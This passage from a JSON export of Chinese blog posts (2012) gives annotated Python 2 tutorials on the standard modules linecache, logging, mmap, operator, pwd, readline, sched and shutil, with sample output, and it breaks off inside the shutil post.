    "content": "<p>前言：linecache是一个被广泛使用的，从文件或者导入模块中检索文本行, 对结果采用缓冲来提高读文件的效率的模块。缓冲的实现是读取文件的内容, 并解析成行, 保存在内存的字典中. API 根据索引返回列表中的请求行. 在读取文件和寻找需要的行信息上可以节省一定时间. 这对于从同一个文件中查询多行内容是非常有用的, 比如为一个error report产生trackback.</p>\n\n<p><pre class=\"sh_python\">\nimport linecache\nimport os\nimport tempfile\ntext='''The design of all built-in operating system dependent modules of Python is such that as long as the same\nfunctionality is available, it uses the same interface; for example, the function <tt>os.stat(path)</tt> returns stat\ninformation about <em>path</em> in the same format (which happens to have originated with the POSIX interface)\nExtensions peculiar to a particular operating system are also available through the <a title=\"os: Miscellaneous operating system interfaces.\" href=\"http://docs.python.org/library/os.html#module-os\"><tt>os</tt></a> module, \nbut using them is of course a threat to portability.</p>\n\n<p>An “Availability: Unix” note means that this function is commonly found on Unix systems. It does not make any claims \nabout its existence on a specific operating system.If not separately noted, all functions that claim “Availability: \nUnix” are supported on Mac OS X, which builds on a Unix core\n'''\ndef make_tempfile():\n    fd, temp_file_name = tempfile.mkstemp()  #创建一个临时文件\n    os.close(fd)\n    f = open(temp_file_name, 'wt')\n    try:\n        f.write(text)\n    finally:\n        f.close()\n    return temp_file_name #返回文件地址</p>\n\n<p>def cleanup(filename):\n    os.unlink(filename) #类似删除文件</p>\n\n<p>filename = make_tempfile()\nprint 'SOURCE: ', text.split('\\n')[4]  #显示第5行  从0开始计数\nprint 'CACHE : ', linecache.getline(filename, 5).rstrip() #显示第5行，从1开始计数\nprint '\\nBLANK : \"%s\"' % linecache.getline(filename, 6)  #第六行为空行  显示空行\nnot_there = linecache.getline(filename, 500) #文件没有500行，所以返回空\nprint '\\nNOT THERE: \"%s\" includes %d characters' %  (not_there, len(not_there)) \nno_such_file = linecache.getline('this_file_does_not_exist.txt', 1) #没有这个文件，但是不会出现异常，返回空\nprint '\\nNO FILE: ', no_such_file\nmodule_line = linecache.getline('linecache.py', 3) #用在输出tracebacks上, 另一个重要特性是可以通过指定模块名在sys.path中寻找python模块源码. \n                                      #如果在当前路径中无法找到文件, 那么linecache中的缓冲直接搜索sys.path中的模块\nprint '\\nMODULE : ', module_line</p>\n\n<p>cleanup(filename)\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 186,
    "title": "关于logging",
    "category": "python模块研究",
    "tags": [
      "logging"
    ],
    "url": "/archives/guanyulogging/",
    "content": "<p>前言：logging为python模块提供状态、错误、信息输出的标准接口</p>\n\n<p><pre class=\"sh_python\">\nimport logging</p>\n\n<p>LOG_FILENAME = 'logging.out'\nlogging.basicConfig(filename=LOG_FILENAME,  #将信息输入到一个文件\n                    level=logging.DEBUG, #级别是DEBUG\n                    )\nlogging.debug('This message should go to the log file') #给文件添加一条信息，如果重复运行就会在文件尾部添加一行一行\nf = open(LOG_FILENAME, 'rt')\ntry:\n    body = f.read()\nfinally:\n    f.close()</p>\n\n<p>print body\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nDEBUG:root:This message should go to the log file  #前面的'DEBUG'是因为设定的级别，root是默认的。后面会修改</p>\n\n<p><pre class=\"sh_python\">\nimport glob\nimport logging\nimport logging.handlers</p>\n\n<p>LOG_FILENAME = 'logging.out'</p>\n\n<p>my_logger = logging.getLogger('MyLogger')  #默认是数据是'root'，这里修改这个标识\nmy_logger.setLevel(logging.DEBUG)</p>\n\n<p>handler = logging.handlers.RotatingFileHandler(LOG_FILENAME,\n                                               maxBytes=20, #文件最大字节数\n                                               backupCount=5, #会轮转5个文件，共6个\n                                               ) #最新的文件总是logging.out，每次达到大小限制，它更名为后缀<tt>.1</tt>，然后.1变成.2，.5删掉\nmy_logger.addHandler(handler)</p>\n\n<p>for i in range(20):  \n    my_logger.debug('i = %d' % i)</p>\n\n<p>logfiles = glob.glob('%s*' % LOG_FILENAME) #查看建立的文件\nfor filename in logfiles:\n    print filename\n</pre>\n详细级别：CRITICAL 50 ERROR 40 WARNING 30 INFO 20 DEBUG 10 UNSET 0，这个数值比如是10的debug，但是设置日志调试记录模式是INFO，那么这个信息不被打印</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 187,
    "title": "关于mmap研究",
    "category": "python模块研究",
    "tags": [
      "mmap"
    ],
    "url": "/archives/guanyummapyanjiu/",
    "content": "<p>前言：mmap全称内存映射文件，需要在<a href=\"http://en.wikipedia.org/wiki/Python_%28programming_\">Python<img src=\"http://i.ixnp.com/images/v3.45/t.gif\" alt=\"\" /></a>程序中存取一个很大的数组，数组的每一项是(int, int, float, int)的记录。如果直接用list来存放，占据的内存巨大（因为不仅所有这些数都是对象，且tuple本身也是对象），或者要将正则表达式应用于匹配整个文件，但又不想将整个文件内容全部读入内存（特别是对于大文件而言，更是如此），那么就是mmap的作用了，Memory-mapped文件可以被当作可变的字符串或类似文件的对象</p>\n\n<p><pre class=\"sh_python\">\nimport mmap\nimport contextlib</p>\n\n<p>with open('text', 'r') as f:  #创建的一个文件text\n    with contextlib.closing(mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)) as m:  #mmap.mmap创建一个内存映射文件,第一个参数是文件描述符，第二个参数要是0，表示隐射全部文件\n                                                #第三个参数可选，ACCESS_READ表示只读，<tt>ACCESS_WRITE</tt>内存直接写文件 <tt>ACCESS_COPY</tt>不会真的修改到源文件\n        print 'First 10 bytes via read :', m.read(10)\n        print 'First 10 bytes via slice:', m[:10]\n        print '2nd   10 bytes via read :', m.read(10)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport mmap\nimport contextlib</p>\n\n<p>word = 'Icinga'\nreversed = word[::-1]\nprint 'Looking for    :', word\nprint 'Replacing with :', reversed</p>\n\n<p>with open('text', 'r+') as f:  #'r+'不能只是写，而是追加\n    with contextlib.closing(mmap.mmap(f.fileno(), 0)) as m:\n        print 'Before:', m.readline().rstrip()   #替换前的源文件\n        m.seek(0)  #指针到文件开头</p>\n\n<p>        loc = m.find(word)   #在内存中找到'Icinga'\n        m[loc:loc+len(word)] = reversed #替换\n        m.flush()</p>\n\n<p>        m.seek(0) \n        print 'After :', m.readline().rstrip()\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 188,
    "title": "关于operator研究",
    "category": "python模块研究",
    "tags": [
      "operator"
    ],
    "url": "/archives/guanyuoperatoryanjiu/",
    "content": "<p>前言：operator是一系列内置的运算接口</p>\n\n<p><pre class=\"sh_python\">\nfrom operator import *</p>\n\n<p>a = -1\nb = 5.0\nc = 2\nd = 6\nprint 'a =', a\nprint 'b =', b\nprint 'c =', c\nprint 'd =', d\nprint '-'*30</p>\n\n<p>print 'not_(a)     :', not_(a) #逻辑判断是不是一个数据\nprint 'truth(a)    :', truth(a) 逻辑判断数据是不是为真\nprint 'is_(a, b)   :', is_(a,b) #逻辑判断a是b的bool结果\nprint 'is_not(a, b):', is_not(a,b) #逻辑判断a不是b的bool结果\nfor func in (lt, le, eq, ne, ge, gt):  \n    print '%s(a, b):' % func.__name__, func(a, b)  #判断大小和相等\nprint '\\nPositive/Negative:' \nprint 'abs(a):', abs(a) #a绝对值\nprint 'neg(a):', neg(a) #a的补数</p>\n\n<p>print '\\nArithmetic:'\nprint 'add(a, b)     :', add(a, b)  #求和\nprint 'div(a, b)     :', div(a, b) #a/b结果\nprint 'div(d, c)     :', div(d, c) \nprint 'floordiv(a, b):', floordiv(a, b) #地板除\nprint 'floordiv(d, c):', floordiv(d, c)\nprint 'mod(a, b)     :', mod(a, b) #\nprint 'mul(a, b)     :', mul(a, b)\nprint 'pow(c, d)     :', pow(c, d)\nprint 'sub(b, a)     :', sub(b, a)\nprint 'truediv(a, b) :', truediv(a, b)\nprint 'truediv(d, c) :', truediv(d, c)</p>\n\n<p>print '\\nBitwise:'\nprint 'and_(c, d)  :', and_(c, d) \nprint 'invert(c)   :', invert(c)\nprint 'lshift(c, d):', lshift(c, d)\nprint 'or_(c, d)   :', or_(c, d)\nprint 'rshift(d, c):', rshift(d, c)\nprint 'xor(c, d)   :', xor(c, d)</p>\n\n<p>a = [ 1, 2, 3 ]\nb = [ 'a', 'b', 'c' ]\nprint 'a =', a\nprint 'b =', b</p>\n\n<p>print '\\nConstructive:'\nprint '  concat(a, b):', concat(a, b)  #序列叠加\nprint '  repeat(a, 3):', repeat(a, 3)  #序列重复3次</p>\n\n<p>print '\\nSearching:'\nprint '  contains(a, 1)  :', contains(a, 1)  #寻找是否a中包含1，返回bool\nprint '  contains(b, \"d\"):', contains(b, \"d\") #寻找是否b中包字母‘d’，返回bool\nprint '  countOf(a, 1)   :', countOf(a, 1) #返回符合值的数量\nprint '  countOf(b, \"d\") :', countOf(b, \"d\")\nprint '  indexOf(a, 5)   :', indexOf(a, 1) #返回符合的索引值</p>\n\n<p>print '\\nAccess Items:'\nprint '  getitem(b, 1)            :', getitem(b, 1) #返回b的第2項\nprint '  getslice(a, 1, 3)        :', getslice(a, 1, 3)#返回序列a的第2－3项\nprint '  setitem(b, 1, \"d\")       :', setitem(b, 1, \"d\"), ', after b =', b #设置b的第二项是‘d’，替换原来的\nprint '  setslice(a, 1, 3, [4, 5]):', setslice(a, 1, 3, [4, 5]), ', after a =', a </p>\n\n<p>print '\\nDestructive:'\nprint '  delitem(b, 1)    :', delitem(b, 1), ', after b =', b #去掉序列b的第2项\nprint '  delslice(a, 1, 3):', delslice(a, 1, 3), ', after a =', a #去掉序列a的第2－3项</p>\n\n<p>a = -1\nb = 5.0\nc = [ 1, 2, 3 ]\nd = [ 'a', 'b', 'c']\nprint 'a =', a\nprint 'b =', b\nprint 'c =', c\nprint 'd =', d\nprint</p>\n\n<p>a = iadd(a, b)\nprint 'a = iadd(a, b) =&gt;', a  #类似于a+=b a变化了\nprint</p>\n\n<p>c = iconcat(c, d)\nprint 'c = iconcat(c, d) =&gt;', c #类似于c+=d c变化了\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\na = -1\nb = 5.0\nc = 2\nd = 6\n------------------------------\nnot_(a)     : False\ntruth(a)    : True\nis_(a, b)   : False\nis_not(a, b): True\nlt(a, b): True\nle(a, b): True\neq(a, b): False\nne(a, b): True\nge(a, b): False\ngt(a, b): False</p>\n\n<p>Positive/Negative:\nabs(a): 1\nneg(a): 1\nneg(b): -5.0\npos(a): -1\npos(b): 5.0</p>\n\n<p>Arithmetic:\nadd(a, b)     : 4.0\ndiv(a, b)     : -0.2\ndiv(d, c)     : 3\nfloordiv(a, b): -1.0\nfloordiv(d, c): 3\nmod(a, b)     : 4.0\nmul(a, b)     : -5.0\npow(c, d)     : 64\nsub(b, a)     : 6.0\ntruediv(a, b) : -0.2\ntruediv(d, c) : 3.0</p>\n\n<p>Bitwise:\nand_(c, d)  : 2\ninvert(c)   : -3\nlshift(c, d): 128\nor_(c, d)   : 6\nrshift(d, c): 1\nxor(c, d)   : 4\na = [1, 2, 3]\nb = ['a', 'b', 'c']</p>\n\n<p>Constructive:\nconcat(a, b): [1, 2, 3, 'a', 'b', 'c']\nrepeat(a, 3): [1, 2, 3, 1, 2, 3, 1, 2, 3]</p>\n\n<p>Searching:\ncontains(a, 1)  : True\ncontains(b, \"d\"): False\ncountOf(a, 1)   : 1\ncountOf(b, \"d\") : 0\nindexOf(a, 5)   : 0</p>\n\n<p>Access Items:\ngetitem(b, 1)            : b\ngetslice(a, 1, 3)        : [2, 3]\nsetitem(b, 1, \"d\")       : None , after b = ['a', 'd', 'c']\nsetslice(a, 1, 3, [4, 5]): None , after a = [1, 4, 5]</p>\n\n<p>Destructive:\ndelitem(b, 1)    : None , after b = ['a', 'c']\ndelslice(a, 1, 3): None , after a = [1]\na = -1\nb = 5.0\nc = [1, 2, 3]\nd = ['a', 'b', 'c']</p>\n\n<p>a = iadd(a, b) =&gt; 4.0</p>\n\n<p>c = iconcat(c, d) =&gt; [1, 2, 3, 'a', 'b', 'c']</p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_prolog\">\nfrom operator import *</p>\n\n<p>class MyObj(object):\n    \"\"\"example class for attrgetter\"\"\"\n    def __init__(self, arg):\n        super(MyObj, self).__init__()\n        self.arg = arg\n    def __repr__(self):\n        return 'MyObj(%s)' % self.arg  #设置出发一个属性的修改，添加了arg这个属性</p>\n\n<p>l = [ MyObj(i) for i in xrange(5) ]\nprint l\ng = attrgetter('arg')  #获取属性arg\nvals = [ g(i) for i in l ]\nprint vals\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_python\">\nfrom operator import *</p>\n\n<p>print 'Dictionaries:'\nl = [ dict(val=i) for i in xrange(5) ]  #这个的意义就是匿名函数：<tt>lambda x, y=5: x[y]</tt>\nprint l\ng = itemgetter('val')\nvals = [ g(i) for i in l ]\nprint vals</p>\n\n<p>print\nprint 'Tuples:'\nl = [ (i, i*2) for i in xrange(5) ]\nprint l\ng = itemgetter(1)\nvals = [ g(i) for i in l ]\nprint vals\n</pre>\n<pre class=\"sh_python\">\nfrom operator import *</p>\n\n<p>class MyObj(object):\n    def __init__(self, val):\n        super(MyObj, self).__init__()\n        self.val = val\n        return\n    def __str__(self):\n        return 'MyObj(%s)' % self.val\n    def __lt__(self, other):  #自定义了比较lt的方法\n        print 'Testing %s &lt; %s' % (self, other)\n        return self.val &lt; other.val\n    def __add__(self, other): #自定义了add的方法\n        print 'Adding %s + %s' % (self, other)\n        return MyObj(self.val + other.val)</p>\n\n<p>a = MyObj(1)\nb = MyObj(2)</p>\n\n<p>print 'Comparison:'\nprint lt(a, b)</p>\n\n<p>print '\\nArithmetic:'\nprint add(a, b)\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nComparison:\nTesting MyObj(1) &lt; MyObj(2)   #触发了a的__lt__\nTrue\nArithmetic:\nAdding MyObj(1) + MyObj(2) #触发了a的__add__\nMyObj(3)</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 189,
    "title": "关于pwd 研究",
    "category": "python模块研究",
    "tags": [
      "pwd"
    ],
    "url": "/archives/guanyupwdyanjiu/",
    "content": "<p>前言：pwd是UNIX口令数据库模块，一般分析的是/etc/passwd的用户信息，\n<table border=\"1\">\n<thead valign=\"bottom\">\n<tr>\n<th>索引</th>\n<th>属性</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody valign=\"top\">\n<tr>\n<td>0</td>\n<td>pw_name</td>\n<td>用户登录名</td>\n</tr>\n<tr>\n<td>1</td>\n<td>pw_passwd</td>\n<td>（可选）加密的密码</td>\n</tr>\n<tr>\n<td>2</td>\n<td>pw_uid</td>\n<td>User id</td>\n</tr>\n<tr>\n<td>3</td>\n<td>pw_gid</td>\n<td>Group id</td>\n</tr>\n<tr>\n<td>4</td>\n<td>pw_gecos</td>\n<td>用户的描述信息</td>\n</tr>\n<tr>\n<td>5</td>\n<td>pw_dir</td>\n<td>家目录</td>\n</tr>\n<tr>\n<td>6</td>\n<td>pw_shell</td>\n<td>登录的shell，默认/bin/bash</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"sh_python\">\nimport pwd  #类似于组数据模块grp\nimport operator</p>\n\n<p>all_user_data = pwd.getpwall()  #获取所有用户信息\ninteresting_users = sorted((u \n                            for u in all_user_data \n                            if not u.pw_name.startswith('_')), \n                            key=operator.attrgetter('pw_name')) #这个排序根据用户名的数据 比如 dongwm在daliu的后面，dongwm在dongwn的前面</p>\n\n<p># Find the longest lengths for a few fields\nusername_length = max(len(u.pw_name) for u in interesting_users) + 1\nhome_length = max(len(u.pw_dir) for u in interesting_users) + 1 #算某个字段的长度</p>\n\n<p># Print report headers\nfmt = '%-*s %4s %-*s %s'\nprint fmt % (username_length, 'User', \n             'UID', \n             home_length, 'Home Dir', \n             'Description')\nprint '-' * username_length, '----', '-' * home_length, '-' * 30  #根据字段最大长度 格式化</p>\n\n<p>for u in interesting_users:\n    print fmt % (username_length, u.pw_name, \n                 u.pw_uid, \n                 home_length, u.pw_dir, \n                 u.pw_gecos)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport pwd\nimport sys</p>\n\n<p>username = sys.argv[1]\nuser_info = pwd.getpwnam(username)  #查询用户数据信息</p>\n\n<p>print 'Username:', user_info.pw_name\nprint 'Password:', user_info.pw_passwd\nprint 'Comment :', user_info.pw_gecos\nprint 'UID/GID :', user_info.pw_uid, '/', user_info.pw_gid\nprint 'Home    :', user_info.pw_dir\nprint 'Shell   :', user_info.pw_shell\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py dongwm\nUsername: dongwm\nPassword: x\nComment : dongwm\nUID/GID : 1000 / 100\nHome    : /home/dongwm\nShell   : /bin/bash\n<pre class=\"sh_python\">\nimport pwd\nimport os\nimport sys</p>\n\n<p>filename = os.path.basename(__file__)\nstat_info = os.stat(filename)\nowner = pwd.getpwuid(stat_info.st_uid).pw_name</p>\n\n<p>print '%s is owned by %s (%s)' % (filename, owner, stat_info.st_uid)</p>\n\n<p>uid = os.getuid()\nuser_info = pwd.getpwuid(uid)\nprint 'Currently running with UID=%s username=%s' % (uid, user_info.pw_name)</p>\n\n<p>执行结果：\ndongwm@linux-dongwm:~&gt; python test.py \ntest.py is owned by dongwm (1000)\nCurrently running with UID=1000 username=dongwm</p>\n\n<p> ~\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 190,
    "title": "关于readline研究",
    "category": "python模块研究",
    "tags": [
      "readline"
    ],
    "url": "/archives/guanyureadlineyanjiu/",
    "content": "<p>前言：readline是一个GNU readline库的API</p>\n\n<p><pre class=\"sh_python\">\nimport readline</p>\n\n<p>readline.parse_and_bind('tab: complete')  #按tab自动补全\nreadline.parse_and_bind('set editing-mode vi')  #设置对某行数据假如按‘ESC’，进入vi模式  这2行也可以写道一个文件里面int.rc ,导入配置：readline.read_init_file('int.rc')</p>\n\n<p>while True:\n    line = raw_input('Prompt (\"stop\" to quit): ')\n    if line == 'stop':\n        break\n    print 'ENTERED: \"%s\"' % line\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport readline\nimport logging</p>\n\n<p>LOG_FILENAME = '/tmp/completer.log'\nlogging.basicConfig(filename=LOG_FILENAME,\n                    level=logging.DEBUG,\n                    )   #记录日志</p>\n\n<p>class SimpleCompleter(object):</p>\n\n<p>    def __init__(self, options):\n        self.options = sorted(options)\n        return</p>\n\n<p>    def complete(self, text, state):\n        response = None\n        if state == 0:\n            if text:\n                self.matches = [s \n                                for s in self.options\n                                if s and s.startswith(text)]\n                logging.debug('%s matches: %s', repr(text), self.matches)\n            else:\n                self.matches = self.options[:]\n                logging.debug('(empty input) matches: %s', self.matches)\n        try:\n            response = self.matches[state]\n        except IndexError:\n            response = None\n        logging.debug('complete(%s, %s) =&gt; %s', \n                      repr(text), state, repr(response))\n        return response</p>\n\n<p>def input_loop():\n    line = ''\n    while line != 'stop':\n        line = raw_input('Prompt (\"stop\" to quit): ')\n        print 'Dispatch %s' % line</p>\n\n<p>readline.set_completer(SimpleCompleter(['start', 'stop', 'list', 'print']).complete)  #注册列表里面几个命令\nreadline.parse_and_bind('tab: complete')  #绑定tab自动补全\ninput_loop()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport readline\nimport logging</p>\n\n<p>LOG_FILENAME = 'completer.log'\nlogging.basicConfig(filename=LOG_FILENAME,\n                    level=logging.DEBUG,\n                    )</p>\n\n<p>class BufferAwareCompleter(object):</p>\n\n<p>    def __init__(self, options):\n        self.options = options  #可选的黎明和2级命令\n        self.current_candidates = [] \n        return</p>\n\n<p>    def complete(self, text, state):\n        response = None\n        if state == 0:    \n            origline = readline.get_line_buffer() #返回行缓冲区的当前内容\n            begin = readline.get_begidx() #返回行自动补全的范围的开始\n            end = readline.get_endidx() #返回行自动补全的范围的结束\n            being_completed = origline[begin:end]  #返回行数据\n            words = origline.split() #因为有2级命令  分割出那级命令</p>\n\n<p>            logging.debug('origline=%s', repr(origline))\n            logging.debug('begin=%s', begin)\n            logging.debug('end=%s', end)\n            logging.debug('being_completed=%s', being_completed)\n            logging.debug('words=%s', words)</p>\n\n<p>            if not words: #弱国使用tab是空 ，返回所有一级命令\n                self.current_candidates = sorted(self.options.keys()) \n            else:\n                try:\n                    if begin == 0: #如果是第一个命令\n                        candidates = self.options.keys()\n                    else:\n                        first = words[0] #2级命令 \n                        candidates = self.options[first] 取第一级命令作为键  取子键</p>\n\n<p>                    if being_completed: #如果有字母\n                        self.current_candidates = [ w for w in candidates\n                                                    if w.startswith(being_completed) ]  #对比是不是注册的命令是不是以这个或这些字母开头\n                    else:\n                        self.current_candidates = candidates  #返回所有</p>\n\n<p>                    logging.debug('candidates=%s', self.current_candidates)</p>\n\n<p>                except (KeyError, IndexError), err:\n                    logging.error('completion error: %s', err)\n                    self.current_candidates = []</p>\n\n<p>        try:\n            response = self.current_candidates[state]\n        except IndexError:\n            response = None\n        logging.debug('complete(%s, %s) =&gt; %s', repr(text), state, response)\n        return response</p>\n\n<p>def input_loop():\n    line = ''\n    while line != 'stop':\n        line = raw_input('Prompt (\"stop\" to quit): ')\n        print 'Dispatch %s' % line</p>\n\n<p>readline.set_completer(BufferAwareCompleter(\n    {'list':['files', 'directories'],\n     'print':['byname', 'bysize'],\n     'stop':[],\n    }).complete)</p>\n\n<p>readline.parse_and_bind('tab: complete')</p>\n\n<p># Prompt the user for text\ninput_loop()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport readline\nimport logging\nimport os</p>\n\n<p>LOG_FILENAME = 'completer.log'\nHISTORY_FILENAME = 'completer.hist'</p>\n\n<p>logging.basicConfig(filename=LOG_FILENAME,\n                    level=logging.DEBUG,\n                    )\ndef get_history_items():\n    return [ readline.get_history_item(i) #返回历史记录中的这条\n             for i in xrange(1, readline.get_current_history_length() + 1)\n             ]</p>\n\n<p>class HistoryCompleter(object):</p>\n\n<p>    def __init__(self):\n        self.matches = []\n        return\n    def complete(self, text, state):\n        response = None\n        if state == 0:\n            history_values = get_history_items()\n            logging.debug('history: %s', history_values)\n            if text:\n                self.matches = sorted(h \n                                      for h in history_values \n                                      if h and h.startswith(text))\n            else:\n                self.matches = []\n            logging.debug('matches: %s', self.matches)\n        try:\n            response = self.matches[state]\n        except IndexError:\n            response = None\n        logging.debug('complete(%s, %s) =&gt; %s', \n                      repr(text), state, repr(response))\n        return response</p>\n\n<p>def input_loop():\n    if os.path.exists(HISTORY_FILENAME):\n        readline.read_history_file(HISTORY_FILENAME)\n    print 'Max history file length:', readline.get_history_length()\n    print 'Startup history:', get_history_items()\n    try:\n        while True:\n            line = raw_input('Prompt (\"stop\" to quit): ')\n            if line == 'stop':\n                break\n            if line:\n                print 'Adding \"%s\" to the history' % line\n    finally:\n        print 'Final history:', get_history_items()\n        readline.write_history_file(HISTORY_FILENAME)   #记录历史记录到文件</p>\n\n<p>readline.set_completer(HistoryCompleter().complete)</p>\n\n<p>readline.parse_and_bind('tab: complete')</p>\n\n<p>input_loop()\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 191,
    "title": "关于sched研究",
    "category": "python模块研究",
    "tags": [
      "sched"
    ],
    "url": "/archives/guanyuschedyanjiu/",
    "content": "<p>前言：我们经常需要定时的执行某个任务，在Linux下我们有强大的crontab，但是在Python这个粒度（定时执行函数），如何处理呢？sched是一个调度（延时处理机制），每次想要定时执行某任务都必须写入一个调度</p>\n\n<p><pre class=\"sh_python\">\nimport sched\nimport time</p>\n\n<p>scheduler = sched.scheduler(time.time, time.sleep)</p>\n\n<p>def print_event(name):\n    print 'EVENT:', time.time(), name</p>\n\n<p>print 'START:', time.time()\nscheduler.enter(2, 1, print_event, ('first',)) #第一个参数代表延迟多久，第二个表示优先级，第三个是需要被调用的函数，地四个是函数的参数（元组类型）\nscheduler.enter(3, 1, print_event, ('second',))</p>\n\n<p>scheduler.run()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nSTART: 1339660487.96\nEVENT: 1339660489.96 first\nEVENT: 1339660490.96 second\n<pre class=\"sh_python\">\nimport sched\nimport time</p>\n\n<p>scheduler = sched.scheduler(time.time, time.sleep)</p>\n\n<p>def long_event(name):\n    print 'BEGIN EVENT :', time.time(), name\n    time.sleep(2)\n    print 'FINISH EVENT:', time.time(), name</p>\n\n<p>print 'START:', time.time()\nscheduler.enter(2, 1, long_event, ('first',))\nscheduler.enter(3, 1, long_event, ('second',))</p>\n\n<p>scheduler.run()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nSTART: 1339660898.83\nBEGIN EVENT : 1339660900.84 first\nFINISH EVENT: 1339660902.84 first\nBEGIN EVENT : 1339660902.84 second\nFINISH EVENT: 1339660904.84 second\n注：run()一直被阻塞, 直到所有事件被全部执行完. 每个事件在同一线程中运行, 所以如果一个事件的执行时间大于其他事件的延迟时间,</p>\n\n<p>那么, 就会产生重叠. 重叠的解决方法是推迟后来事件的执行时间. 这样保证没有丢失任何事件, 但这些事件的调用时刻会比原先设定的迟</p>\n\n<p>上面的例子第二个事件在第一个事件运行结束后立即运行, 因为第一个事件的执行时间足够长, 已经超过第二个事件的预期开始时刻.（本来应该1339660903秒运行）</p>\n\n<p><pre class=\"sh_python\">\nimport sched\nimport time</p>\n\n<p>scheduler = sched.scheduler(time.time, time.sleep)\nnow = time.time()\ndef print_event(name):\n    print 'EVENT:', time.time(), name\nprint 'START:', now\nscheduler.enterabs(now+2, 2, print_event, ('first',)) #enterabs保证事件准确的在同一时刻执行,,第一个参数是运行事件的确切时间, 而不是延迟时间量\nscheduler.enterabs(now+2, 1, print_event, ('second',))\nscheduler.run()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sched\nimport threading\nimport time</p>\n\n<p>scheduler = sched.scheduler(time.time, time.sleep)</p>\n\n<p>counter = 0 #一个全局变量的计数器</p>\n\n<p>def increment_counter(name):</p>\n\n<p>    global counter\n    print 'EVENT:', time.time(), name\n    counter += 1\n    print 'NOW:', counter</p>\n\n<p>print 'START:', time.time()\ne1 = scheduler.enter(2, 1, increment_counter, ('E1',))\ne2 = scheduler.enter(3, 1, increment_counter, ('E2',))</p>\n\n<p>t = threading.Thread(target=scheduler.run) #enter()和enterabs()返回一事件的引用, 该引用可被用于事件的取消. 由于run()阻塞, \n             #所以事件的取消操作需要在另外一个线程中进行. 如下例子, 在一个子线程开始执行调度, 而主处理线程用于取消某个事件\nt.start()\nscheduler.cancel(e1)  #取消了e1的那个调度\nt.join()  #等调度完成再开始下一个\nprint 'FINAL:', counter\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 192,
    "title": "关于shutil研究",
    "category": "linux基础",
    "tags": [
      "shutil"
    ],
    "url": "/archives/guanyu-3/",
    "content": "<p>前言：shutil是一个高层次的文件操作，比如复制，移动和修改权限等</p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport time \nfrom shutil import *\nfrom commands import *\nprint 'BEFORE:', os.listdir(os.getcwd())\ncopyfile('text', 'test_to_copy')   #将源文件内容完全复制给目标文件. 如果没有写入目标文件的权限, 会引起IOError. \n                            #由于该函数是为了读取文件内容而打开此输入文件, 而不管它的类型是什么, 特殊类型的文件使用copyfile()是不能拷贝的, 比如管道文件\nprint 'AFTER:', os.listdir(os.getcwd())\nprint\nos.mkdir('example')\nprint 'BEFORE:', os.listdir('example')\ncopy('test.py', 'example') #类似于Unix命令cp. 如果目标参数是一个目录而不是一个文件, 那么在这个目录中复制一个源文件副本(它与源文件同名). 文件的权限也随之复制\nprint 'AFTER:', os.listdir('example')\nprint\ndef show_file_info(filename):\n    stat_info = os.stat(filename)\n    print '\\tMode    :', stat_info.st_mode\n    print '\\tCreated :', time.ctime(stat_info.st_ctime)\n    print '\\tAccessed:', time.ctime(stat_info.st_atime)\n    print '\\tModified:', time.ctime(stat_info.st_mtime)\nrmtree('example') #可以删除整个目录树. 里面若产生错误会作为异常抛出. 但是如果它的第二个参数是目录树, 那么错误会被忽略, 第三个参数可以指定为一个特殊出错处理函数句柄.\nos.mkdir('example')\nprint 'SOURCE:'\nshow_file_info('test.py')\ncopy2('test', 'example') #copy2()函数类似于copy(), 但是它将一些元信息, 如文件最后一次被读取时间和修改时间等, 也复制至新文件中.\nprint 'DEST:'\nshow_file_info('test.py')\nprint\nprint 'BEFORE:', getstatus('test1.py')\ncopymode('test.py', 'test1.py')\nprint 'AFTER :', getstatus('test1.py')\nprint\nprint 'BEFORE:'\nshow_file_info('test1.py')\ncopystat('test.py', 'test1.py') #复制文件的其他元信息(权限, 最后读取时间, 最后修改时间)\nprint 'AFTER :'\nshow_file_info('test1.py')\nprint\nprint 'BEFORE:'\nprint getoutput('ls -rlast /tmp/example')\ncopytree('example', '/tmp/example')\nprint 'AFTER:'\nprint getoutput('ls -rlast /tmp/example')\nprint\nprint 'BEFORE: example : ', os.listdir('example')\nmove('example', 'example2')\nprint 'AFTER : example2: ', os.listdir('example2')\n</pre></p>\n\n<p>执行结果</p>\n\n<p>dongwm@linux-dongwm:~/test&gt; python test.py</p>\n\n<p>BEFORE: ['text', 'test.py']\nAFTER: ['text', 'test.py', 